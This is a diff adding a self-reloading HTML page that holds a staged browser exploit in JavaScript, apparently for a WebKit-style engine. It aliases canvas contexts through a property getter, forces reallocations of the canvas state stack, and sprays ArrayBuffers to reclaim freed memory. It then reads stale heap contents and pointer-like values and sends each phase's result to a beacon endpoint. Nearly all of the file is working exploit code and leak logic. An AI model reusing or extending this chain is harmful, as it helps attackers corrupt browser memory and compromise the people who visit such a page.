@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V651</title></head>
+<body><pre id="out">V651 — stateStack realloc + AB reclaim chain</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<80;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){var img=_imgs[_ix++%80];img.src='/beacon/V651-'+tag+'?d='+encodeURIComponent(String(d).slice(0,600))+'&t='+Date.now();}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _b8b=new ArrayBuffer(8),_bu64;
+try{_bu64=new BigUint64Array(_b8b);}catch(e){}
+var _f64b=new Float64Array(_b8b);
+function f2h(v){_f64[0]=v;return ('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+
+bk('BOOT','v651-chain');
+
+/* ============================================================
+ * PHASE 1: V573 alias
+ * ============================================================ */
+var c1=document.createElement('canvas');c1.width=1;c1.height=1;
+var innerCtx=null;
+var opts={};
+Object.defineProperty(opts,'alpha',{get:function(){
+  innerCtx=c1.getContext('2d');
+  innerCtx.lineWidth=99999.5;
+  return true;
+}});
+c1.getContext('bitmaprenderer',opts);
+
+var spray=[];
+for(var s=0;s<300;s++){
+  var sc=document.createElement('canvas');sc.width=1;sc.height=1;
+  spray.push({c:sc,x:sc.getContext('2d')});
+}
+var aliasIdx=-1;
+if(innerCtx){
+  innerCtx.lineWidth=55555.5;
+  for(var k=0;k<spray.length;k++){
+    if(spray[k].x.lineWidth===55555.5){aliasIdx=k;break;}
+  }
+}
+bk('P1','alias='+aliasIdx);
+if(aliasIdx<0){bk('DEAD','no-alias');say('DEAD');setTimeout(function(){location.reload();},8000);}
+
+/* ============================================================
+ * PHASE 2: Grow stateStack, set markers, trigger realloc
+ * save()x15 → cap=16, buf B1 (6400B, class 6656)
+ * Set lineWidth markers on each state level
+ * save() #16 → realloc → B1 freed → B2 (12800B, cap=32)
+ * ============================================================ */
+for(var i=0;i<15;i++){
+  innerCtx.save();
+  innerCtx.lineWidth=1000+i;
+}
+bk('P2','sz=16,lw='+innerCtx.lineWidth);
+
+innerCtx.save();
+innerCtx.lineWidth=7777.7;
+bk('P3','realloc1,lw='+innerCtx.lineWidth);
+
+/* ============================================================
+ * PHASE 3: AB(6400) spray → reclaim B1
+ * Test: do any ABs have stale State data? (expect: NO, zero-init)
+ * ============================================================ */
+var N1=200;
+var abs1=new Array(N1);
+for(var i=0;i<N1;i++) abs1[i]=new ArrayBuffer(6400);
+
+var stale1=0,sv1='';
+for(var j=0;j<N1;j++){
+  var fv=new Float64Array(abs1[j]);
+  for(var k=0;k<Math.min(fv.length,850);k++){
+    if(fv[k]!==0){stale1++;if(sv1.length<200)sv1+=j+':'+k+'='+f2h(fv[k])+' ';break;}
+  }
+}
+bk('P4','staleAB='+stale1+',v='+sv1.slice(0,200));
+
+/* ============================================================
+ * PHASE 4: Test lineDash large round-trip through alias
+ * 800 doubles (6400B) → confirms setLineDash/getLineDash capacity
+ * ============================================================ */
+var dash=new Array(800);
+for(var i=0;i<800;i++) dash[i]=3.14159+i*0.001;
+try{innerCtx.setLineDash(dash);}catch(e){bk('DERR',e.name);}
+var rd=[];
+try{rd=innerCtx.getLineDash();}catch(e){}
+var dok=rd.length===800&&Math.abs(rd[0]-3.14159)<0.0001&&Math.abs(rd[799]-3.94059)<0.01;
+bk('P5','dash='+rd.length+',ok='+dok);
+
+/* ============================================================
+ * PHASE 5: Gradient fillStyle → confirm pointer storage
+ * ============================================================ */
+var grad=null;
+try{
+  grad=innerCtx.createLinearGradient(0,0,10,10);
+  grad.addColorStop(0,'red');
+  grad.addColorStop(1,'blue');
+  innerCtx.fillStyle=grad;
+}catch(e){}
+var fs1='';
+try{fs1=String(innerCtx.fillStyle);}catch(e){fs1='ERR';}
+var fs2='';
+try{fs2=String(spray[aliasIdx].x.fillStyle);}catch(e){fs2='ERR';}
+bk('P6','fs='+fs1.slice(0,40)+',spy='+fs2.slice(0,40));
+
+/* ============================================================
+ * PHASE 6: Second realloc → B2 freed → AB(12800) spray
+ * Fill to cap=32, then trigger realloc to cap=64
+ * Scan B2's AB for uninitialized tail data (bytes 6800-12800)
+ * This tail was NEVER written by the move constructor!
+ * ============================================================ */
+for(var i=0;i<15;i++){
+  innerCtx.save();
+  innerCtx.lineWidth=2000+i;
+}
+innerCtx.save();
+innerCtx.lineWidth=8888.8;
+bk('P7','realloc2');
+
+var N2=80;
+var abs2=new Array(N2);
+for(var i=0;i<N2;i++) abs2[i]=new ArrayBuffer(12800);
+
+var stale2=0,sv2='',tailHits=0;
+for(var j=0;j<N2;j++){
+  var fv=new Float64Array(abs2[j]);
+  var tailStart=Math.floor(6800/8);
+  for(var k=tailStart;k<fv.length;k++){
+    if(fv[k]!==0){
+      tailHits++;
+      if(sv2.length<300) sv2+=j+':'+k+'='+f2h(fv[k])+' ';
+      if(tailHits>=10) break;
+    }
+  }
+  if(tailHits>=10) break;
+  for(var k=0;k<tailStart;k++){
+    if(fv[k]!==0){stale2++;if(sv2.length<300)sv2+=j+':'+k+'h='+f2h(fv[k])+' ';break;}
+  }
+}
+bk('P8','tail='+tailHits+',head='+stale2+',v='+sv2.slice(0,300));
+
+/* ============================================================
+ * PHASE 7: Restore to free lineDash → reclaim with AB
+ * If lineDash uses tryFastMalloc (NOT calloc), the AB that
+ * reclaims it contains our 3.14159+i pattern as STALE DATA
+ * ============================================================ */
+innerCtx.restore();
+var N3=100;
+var abs3=new Array(N3);
+for(var i=0;i<N3;i++) abs3[i]=new ArrayBuffer(6400);
+
+var dashHit=-1,dashOff=-1;
+for(var j=0;j<N3;j++){
+  var fv=new Float64Array(abs3[j]);
+  for(var k=0;k<20;k++){
+    if(Math.abs(fv[k]-3.14159)<0.001){dashHit=j;dashOff=k;break;}
+  }
+  if(dashHit>=0) break;
+}
+bk('P9','ldAB='+dashHit+',off='+dashOff);
+
+if(dashHit>=0){
+  var fv=new Float64Array(abs3[dashHit]);
+  var samp=[];
+  for(var i=0;i<6;i++) samp.push(fv[dashOff+i].toFixed(5));
+  bk('P10','***LDRECLAIM:'+samp.join(',')+'***');
+  say('*** LINEDASH AB RECLAIM: '+samp.join(', ')+' ***');
+}
+
+/* ============================================================
+ * PHASE 8: getTransform through alias → DOMMatrix values
+ * ============================================================ */
+var mx=null;
+try{mx=innerCtx.getTransform();}catch(e){}
+if(mx){
+  bk('P11','mx='+mx.a+','+mx.b+','+mx.c+','+mx.d+','+mx.e+','+mx.f);
+}
+
+c1._s=spray;c1._a1=abs1;c1._a2=abs2;c1._a3=abs3;
+bk('DONE','v651');
+say('DONE');
+setTimeout(function(){location.reload();},20000);
+</script>
+</body></html>
